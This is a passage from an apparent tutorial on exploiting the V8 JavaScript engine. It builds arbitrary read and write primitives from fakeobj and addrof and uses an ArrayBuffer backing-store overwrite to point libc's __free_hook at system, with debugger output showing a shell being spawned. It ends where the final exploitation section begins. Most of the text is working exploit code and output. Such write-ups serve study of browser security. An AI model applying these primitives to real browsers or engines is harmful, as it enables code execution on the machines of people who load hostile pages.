<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="nx">d8</span><span class="o">&gt;</span> <span class="nx">test_arr</span> <span class="o">=</span> <span class="p">[</span><span class="mh">0x1337</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">4919</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="nx">d8</span><span class="o">&gt;</span> <span class="nx">crafted_arr</span> <span class="o">=</span> <span class="p">[</span><span class="nx">fl_arr_map</span><span class="p">,</span> <span class="mf">1.1</span><span class="p">,</span> <span class="mf">1.2</span><span class="p">,</span> <span class="mf">1.3</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mf">1.82361084311683</span><span class="nx">e</span><span class="o">-</span><span class="mi">310</span><span class="p">,</span> <span class="mf">1.1</span><span class="p">,</span> <span class="mf">1.2</span><span class="p">,</span> <span class="mf">1.3</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="c1">// creating our fake object on top of our crafted array
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">d8</span><span class="o">&gt;</span> <span class="kd">let</span> <span class="nx">_fake</span> <span class="o">=</span> <span class="nx">fakeobj</span><span class="p">(</span><span class="nx">addrof</span><span class="p">(</span><span class="nx">crafted_arr</span><span class="p">)</span><span class="o">-</span><span class="mh">0x20</span><span class="nx">n</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="kc">undefined</span>
</span></span><span class="line"><span class="cl"><span class="c1">// overwriting what would be _fake&#39;s elements pointer
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">d8</span><span class="o">&gt;</span> <span class="nx">crafted_arr</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="nx">itof</span><span class="p">(</span><span class="nx">addrof</span><span class="p">(</span><span class="nx">test_arr</span><span class="p">)</span><span class="o">+</span><span class="mi">16</span><span class="nx">n</span><span class="o">-</span><span class="mh">0x10</span><span class="nx">n</span><span class="p">);</span>  
</span></span><span class="line"><span class="cl"><span class="mf">1.34989222600073</span><span class="nx">e</span><span class="o">-</span><span class="mi">310</span>
</span></span><span class="line"><span class="cl"><span class="nx">d8</span><span class="o">&gt;</span> <span class="nx">elements_ptr</span> <span class="o">=</span> <span class="nx">_fake</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="mf">1.349892225996</span><span class="nx">e</span><span class="o">-</span><span class="mi">310</span>
</span></span><span class="line"><span class="cl"><span class="nx">d8</span><span class="o">&gt;</span> <span class="s2">&#34;0x&#34;</span><span class="o">+</span><span class="nx">ftoi</span><span class="p">(</span><span class="nx">elements_ptr</span><span class="p">).</span><span class="nx">toString</span><span class="p">(</span><span class="mi">16</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;0x18d96d6d5e41&#34;</span> <span class="c1">// this is test_arr elements pointer
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">d8</span><span class="o">&gt;</span> <span class="o">%</span><span class="nx">DebugPrint</span><span class="p">(</span><span class="nx">test_arr</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="mh">0x18d96d6d5e71</span> <span class="o">&lt;</span><span class="nx">JSArray</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nx">d8</span><span class="o">&gt;</span> <span class="o">%</span><span class="nx">DebugPrint</span><span class="p">(</span><span class="nx">crafted_arr</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="mh">0x18d9bd6d5e71</span> <span class="o">&lt;</span><span class="nx">JSArray</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="err">─────────────────────────────────────────────────────────────────────────────</span>
</span></span><span class="line"><span class="cl"><span class="c1">// test_arr
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">pwndbg</span><span class="o">&gt;</span> <span class="nx">x</span><span class="o">/</span><span class="mi">4</span><span class="nx">xg</span> <span class="mh">0x18d96d6d5e71</span><span class="o">-</span><span class="mi">1</span> 
</span></span><span class="line"><span class="cl"><span class="mh">0x18d96d6d5e70</span><span class="o">:</span>	<span class="mh">0x00002191d8fc2ed9</span>	<span class="mh">0x00003261124c0c71</span>         <span class="c1">//JSArray
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="mh">0x18d96d6d5e80</span><span class="o">:</span>	<span class="mh">0x000018d96d6d5e41</span>	<span class="mh">0x0000000400000000</span>
</span></span><span class="line"><span class="cl"><span class="c1">//                      ^--elements_ptr
</span></span></span><span class="line"><span class="cl"><span class="c1">// crafted_arr before modification
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">pwndbg</span><span class="o">&gt;</span> <span class="nx">x</span><span class="o">/</span><span class="mi">8</span><span class="nx">xg</span> <span class="mh">0x18d9bd6d5e70</span><span class="o">-</span><span class="mh">0x20</span>   <span class="c1">// FixedDoubleArray holding 
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                                    <span class="c1">// JSArray&#39;s elements (at JSArray-0x20) 
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                                    <span class="c1">// _fake fakeobj is created here	
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="mh">0x18d9bd6d5e50</span><span class="o">:</span>	<span class="mh">0x00002a91d8fc2ed9</span>	<span class="mh">0x3ff199999999999a</span>
</span></span><span class="line"><span class="cl"><span class="c1">//                     ^--fl_arr_map		^--1.1
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="mh">0x18d9bd6d5e60</span><span class="o">:</span>	<span class="mh">0x3ff3333333333333</span>	<span class="mh">0x3ff4cccccccccccd</span>
</span></span><span class="line"><span class="cl"><span class="c1">//                     ^--1.2				^--1.3
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="mh">0x18d9bd6d5e70</span><span class="o">:</span>	<span class="mh">0x000021b1d8fc2ed9</span>	<span class="mh">0x00003461124c0c71</span>         <span class="c1">//JSArray
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="mh">0x18d9bd6d5e80</span><span class="o">:</span>	<span class="mh">0x000018d9bd6d5e41</span>	<span class="mh">0x0000000400000000</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>We can create a JS function for this primitive as follows:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">crafted_arr</span> <span class="o">=</span> <span class="p">[</span><span class="nx">fl_arr_map</span><span class="p">,</span> <span class="mf">1.2</span><span class="p">,</span> <span class="mf">1.3</span><span class="p">,</span> <span class="mf">1.4</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">arb_read</span><span class="p">(</span><span class="nx">addr</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// We have to use tagged pointers for reading, so we tag the addr
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">if</span> <span class="p">(</span><span class="nx">addr</span> <span class="o">%</span> <span class="mi">2</span><span class="nx">n</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="nx">addr</span> <span class="o">+=</span> <span class="mi">1</span><span class="nx">n</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// Place a fakeobj right on top of our crafted array with a float array map
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kd">let</span> <span class="nx">fake</span> <span class="o">=</span> <span class="nx">fakeobj</span><span class="p">(</span><span class="nx">addrof</span><span class="p">(</span><span class="nx">crafted_arr</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x20</span><span class="nx">n</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// Change the elements pointer using our crafted array to read_addr-0x10
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nx">crafted_arr</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="nx">itof</span><span class="p">(</span><span class="nx">BigInt</span><span class="p">(</span><span class="nx">addr</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x10</span><span class="nx">n</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// Index 0 will then return the value at read_addr
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">return</span> <span class="nx">ftoi</span><span class="p">(</span><span class="nx">fake</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h1 id="05---introducing-an-arbitrary-write-primitive">05 - Introducing an Arbitrary Write Primitive</h1>
<p>One could argue that to achieve an arbitrary write primitive would be as simple as achieving an arbitrary read primitive, however this is not the case unfortunately.
We can use the same concept as to leverage our <code>fakeobj</code> primitive, but with a twist.</p>
<p>we can write an intial write primitive following the previous implementation of <code>addrof</code>:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">initial_arb_write</span><span class="p">(</span><span class="nx">addr</span><span class="p">,</span> <span class="nx">val</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// Place a fakeobj right on top of our crafted array with a float array map
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kd">let</span> <span class="nx">fake</span> <span class="o">=</span> <span class="nx">fakeobj</span><span class="p">(</span><span class="nx">addrof</span><span class="p">(</span><span class="nx">arb_rw_arr</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x20</span><span class="nx">n</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// Change the elements pointer using our crafted array to write_addr-0x10
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nx">arb_rw_arr</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="nx">itof</span><span class="p">(</span><span class="nx">BigInt</span><span class="p">(</span><span class="nx">addr</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x10</span><span class="nx">n</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// Write to index 0 as a floating point value
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nx">fake</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nx">itof</span><span class="p">(</span><span class="nx">BigInt</span><span class="p">(</span><span class="nx">val</span><span class="p">));</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>We can see that this implementation of a write primitive will work for writes to objects as seen below:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="nx">d8</span><span class="o">&gt;</span> <span class="nx">test_arr</span> <span class="o">=</span> <span class="p">[</span><span class="mf">1.1</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mf">1.1</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="nx">d8</span><span class="o">&gt;</span> <span class="o">%</span><span class="nx">DebugPrint</span><span class="p">(</span><span class="nx">test_arr</span><span class="p">)</span>         
</span></span><span class="line"><span class="cl"><span class="mh">0x3ae05860f8b1</span> <span class="o">&lt;</span><span class="nx">JSArray</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mf">1.1</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="nx">d8</span><span class="o">&gt;</span> <span class="nx">initial_arb_write</span><span class="p">(</span><span class="nx">addrof</span><span class="p">(</span><span class="nx">test_arr</span><span class="p">),</span> <span class="mh">0x1337</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="err">─────────────────────────────────────────────────────────────────────────────</span>
</span></span><span class="line"><span class="cl"><span class="nx">pwndbg</span><span class="o">&gt;</span><span class="nx">x</span><span class="o">/</span><span class="nx">xg</span> <span class="mh">0x3ae05860f8b1</span><span class="o">-</span><span class="mi">1</span>
</span></span><span class="line"><span class="cl"><span class="mh">0x3ae05860f8b0</span><span class="o">:</span>	<span class="mh">0x0000000000001337</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>However, if we try to overwrite libc pointers, we will see this primitive causes a crash as shown below:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="nx">pwndbg</span><span class="o">&gt;</span> <span class="nx">p</span> <span class="nx">system</span>
</span></span><span class="line"><span class="cl"><span class="nx">$3</span> <span class="o">=</span> <span class="p">{</span><span class="kr">int</span> <span class="p">(</span><span class="kr">const</span> <span class="kr">char</span> <span class="o">*</span><span class="p">)}</span> <span class="mh">0x7ffff7c78410</span> <span class="o">&lt;</span><span class="nx">__libc_system</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nx">pwndbg</span><span class="o">&gt;</span> <span class="nx">p</span> <span class="o">&amp;</span><span class="nx">__free_hook</span>
</span></span><span class="line"><span class="cl"><span class="nx">$5</span> <span class="o">=</span> <span class="p">(</span><span class="k">void</span> <span class="p">(</span><span class="o">**</span><span class="p">)(</span><span class="k">void</span> <span class="o">*</span><span class="p">,</span> <span class="kr">const</span> <span class="k">void</span> <span class="o">*</span><span class="p">))</span> <span class="mh">0x7ffff7e11b28</span> <span class="o">&lt;</span><span class="nx">__free_hook</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nx">pwndbg</span><span class="o">&gt;</span> <span class="nx">c</span>
</span></span><span class="line"><span class="cl"><span class="nx">Continuing</span><span class="p">.</span>
</span></span><span class="line"><span class="cl"><span class="err">─────────────────────────────────────────────────────────────────────────────</span>
</span></span><span class="line"><span class="cl"><span class="nx">d8</span><span class="o">&gt;</span> <span class="nx">initial_arb_write</span><span class="p">(</span><span class="mh">0x7ffff7e11b28</span><span class="p">,</span> <span class="mh">0x7ffff7c78410</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nx">Thread</span> <span class="mi">1</span> <span class="s2">&#34;d8&#34;</span> <span class="nx">received</span> <span class="nx">signal</span> <span class="nx">SIGSEGV</span><span class="p">,</span> <span class="nx">Segmentation</span> <span class="nx">fault</span><span class="p">.</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Reasons why this happens are not clear, but having a conversation with @farazsth98 regarding this subject, he believes this fault is due to some integrity checks run by v8 in order to avoid these type of write primitives.
However, there is a work-around to this issue by using a <code>ArrayBuffer</code> and a <code>DataView</code> object, by overwriting the <code>backing store</code> pointer of the <code>ArrayBuffer</code> and using a <code>DataView</code> instance to write a 64-bit value into the ArrayBuffer <code>backing store</code>.</p>
<p>Here are the specs of <a href="https://v8docs.nodesource.com/node-13.2/d5/d6e/classv8_1_1_array_buffer.html">ArrayBuffer</a> and <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/DataView/setBigUint64">DataView</a> objects. This works as follows:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">arb_write</span><span class="p">(</span><span class="nx">addr</span><span class="p">,</span> <span class="nx">val</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="c1">// creating an ArrayBuffer holding the value of a 64-bit pointer
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kd">let</span> <span class="nx">buf</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">ArrayBuffer</span><span class="p">(</span><span class="mi">8</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	
</span></span><span class="line"><span class="cl">	<span class="c1">// creating a dataview for the ArrayBuffer object
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kd">let</span> <span class="nx">dataview</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">DataView</span><span class="p">(</span><span class="nx">buf</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	
</span></span><span class="line"><span class="cl">	<span class="c1">// retrieving the address of the ArrayBuffer object
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kd">let</span> <span class="nx">buf_addr</span> <span class="o">=</span> <span class="nx">addrof</span><span class="p">(</span><span class="nx">buf</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	
</span></span><span class="line"><span class="cl">	<span class="c1">// retrieveing the address of the backing_store pointer of the
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="c1">// ArrayBuffer object located at offset +0x20
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kd">let</span> <span class="nx">backing_store_addr</span> <span class="o">=</span> <span class="nx">buf_addr</span> <span class="o">+</span> <span class="mh">0x20</span><span class="nx">n</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	
</span></span><span class="line"><span class="cl">	<span class="c1">// overwritting the backing_store pointer with the value we desire
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="c1">// to overwrite
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nx">initial_arb_write</span><span class="p">(</span><span class="nx">backing_store_addr</span><span class="p">,</span> <span class="nx">addr</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	
</span></span><span class="line"><span class="cl">	<span class="c1">// using the dataview to dereference the backing pointer and to
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="c1">// do the write for us
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nx">dataview</span><span class="p">.</span><span class="nx">setBigUint64</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nx">BigInt</span><span class="p">(</span><span class="nx">val</span><span class="p">),</span> <span class="kc">true</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="c1">// syntax: setBigUint64(byteOffset, value, littleEndian)
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>By applying this technique, we can observe that the write does not SEGFAULT any more:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">pwndbg</span><span class="o">&gt;</span> <span class="n">p</span> <span class="n">system</span>
</span></span><span class="line"><span class="cl"><span class="err">$</span><span class="mi">8</span> <span class="o">=</span> <span class="p">{</span><span class="kt">int</span> <span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="p">)}</span> <span class="mh">0x7ffff7c78410</span> <span class="o">&lt;</span><span class="n">__libc_system</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="n">pwndbg</span><span class="o">&gt;</span> <span class="n">p</span> <span class="o">&amp;</span><span class="n">__free_hook</span>
</span></span><span class="line"><span class="cl"><span class="err">$</span><span class="mi">10</span> <span class="o">=</span> <span class="p">(</span><span class="kt">void</span> <span class="p">(</span><span class="o">**</span><span class="p">)(</span><span class="kt">void</span> <span class="o">*</span><span class="p">,</span> <span class="k">const</span> <span class="kt">void</span> <span class="o">*</span><span class="p">))</span> <span class="mh">0x7ffff7e11b28</span> <span class="o">&lt;</span><span class="n">__free_hook</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="n">pwndbg</span><span class="o">&gt;</span> <span class="n">c</span>
</span></span><span class="line"><span class="cl"><span class="n">Continuing</span><span class="p">.</span>
</span></span><span class="line"><span class="cl"><span class="err">─────────────────────────────────────────────────────────────────────────────</span>
</span></span><span class="line"><span class="cl"><span class="n">d8</span><span class="o">&gt;</span> <span class="nf">arb_write</span><span class="p">(</span><span class="mh">0x7ffff7e11b28</span><span class="p">,</span> <span class="mh">0x7ffff7c78410</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">undefined</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="n">Attaching</span> <span class="n">after</span> <span class="n">Thread</span> <span class="mh">0x7ffff7c22280</span> <span class="p">(</span><span class="n">LWP</span> <span class="mi">65392</span><span class="p">)</span> <span class="n">vfork</span> <span class="n">to</span> <span class="n">child</span> <span class="n">process</span> <span class="mi">65394</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="n">New</span> <span class="n">inferior</span> <span class="mi">2</span> <span class="p">(</span><span class="n">process</span> <span class="mi">65394</span><span class="p">)]</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="n">Thread</span> <span class="n">debugging</span> <span class="n">using</span> <span class="n">libthread_db</span> <span class="n">enabled</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">Using</span> <span class="n">host</span> <span class="n">libthread_db</span> <span class="n">library</span> <span class="s">&#34;/lib/x86_64-linux-gnu/libthread_db.so.1&#34;</span><span class="p">.</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="n">Detaching</span> <span class="n">vfork</span> <span class="n">parent</span> <span class="n">process</span> <span class="mi">65392</span> <span class="n">after</span> <span class="n">child</span> <span class="n">exec</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="n">Inferior</span> <span class="mi">1</span> <span class="p">(</span><span class="n">process</span> <span class="mi">65392</span><span class="p">)</span> <span class="n">detached</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">process</span> <span class="mi">65394</span> <span class="n">is</span> <span class="n">executing</span> <span class="n">new</span> <span class="nl">program</span><span class="p">:</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">dash</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h1 id="06---exploitation">06 - Exploitation</h1>
<h3 id="version-information">Version information:</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">/v8/out.gn/x64.release$ uname -a
</span></span><span class="line"><span class="cl">Linux ubuntu 5.8.0-50-generic <span class="c1">#56~20.04.1-Ubuntu SMP Mon Apr 12 21:46:35 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux</span>
</span></span><span class="line"><span class="cl">/v8/out.gn/x64.release$ ./d8 -v
</span></span><span class="line"><span class="cl">V8 version 7.5.0 <span class="o">(</span>candidate<span class="o">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="0601---overwritting-__free_hook-to-system">06.01 - Overwritting __free_hook to system</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span><span class="lnt">110
</span><span class="lnt">111
</span><span class="lnt">112
</span><span class="lnt">113
</span><span class="lnt">114
</span><span class="lnt">115
</span><span class="lnt">116
</span><span class="lnt">117
</span><span class="lnt">118
</span><span class="lnt">119
</span><span class="lnt">120
</span><span class="lnt">121
</span><span class="lnt">122
</span><span class="lnt">123
</span><span class="lnt">124
</span><span class="lnt">125
</span><span class="lnt">126
</span><span class="lnt">127
</span><span class="lnt">128
</span><span class="lnt">129
</span><span class="lnt">130
</span><span class="lnt">131
</span><span class="lnt">132
</span><span class="lnt">133
</span><span class="lnt">134
</span><span class="lnt">135
</span><span class="lnt">136
</span><span class="lnt">137
</span><span class="lnt">138
</span><span class="lnt">139
</span></code></pre></td>
<td class="lntd">
